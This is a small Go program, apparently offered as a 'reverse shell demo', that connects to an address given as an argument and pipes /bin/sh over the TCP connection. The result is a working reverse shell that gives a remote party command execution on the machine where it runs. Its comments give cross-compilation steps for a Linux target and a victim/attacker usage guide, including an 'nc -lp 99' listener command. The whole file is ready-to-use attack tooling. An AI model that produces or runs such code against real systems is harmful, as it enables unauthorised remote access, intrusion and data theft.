package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
)

var (
	shell    = "/bin/sh"
	remoteIp string
)

/*
go cross compiling
ref: https://go.dev/doc/install/source#environment
ref: https://www.jianshu.com/p/3ff21f818182

windows cross compile linux elf, default is windows exe
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build reverse_shell.go

victim:
./reverse_shell 127.0.0.1:99

attacker:
nc -lp 99
after connection, attack can exec system command
*/

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: " + os.Args[0] + " <remoteAddress>")
		os.Exit(1)
	}

	remoteIp = os.Args[1]
	remoteConn, err := net.Dial("tcp", remoteIp)
	if err != nil {
		log.Fatal("Connection Error: ", err)
	}

	_, _ = remoteConn.Write([]byte("[+] reverse shell demo \n"))

	command := exec.Command(shell)
	command.Env = os.Environ()
	command.Stdin = remoteConn
	command.Stdout = remoteConn
	command.Stderr = remoteConn
	_ = command.Run()

}
